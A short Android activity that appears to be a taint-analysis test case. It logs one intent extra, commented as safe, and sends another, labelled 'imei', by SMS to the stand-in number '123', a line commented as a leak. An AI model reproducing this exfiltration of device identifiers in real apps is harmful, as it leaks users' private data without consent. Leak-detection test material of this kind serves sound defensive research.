package com.rdict.t5;
import android.app.Activity; import android.os.Bundle;
public class KeySink extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        android.util.Log.i("t5", getIntent().getStringExtra("title"));   // an toàn: key khác
        String id = getIntent().getStringExtra("imei");
        android.telephony.SmsManager.getDefault().sendTextMessage("123", null, id, null, null);   // rò rỉ
    }
}
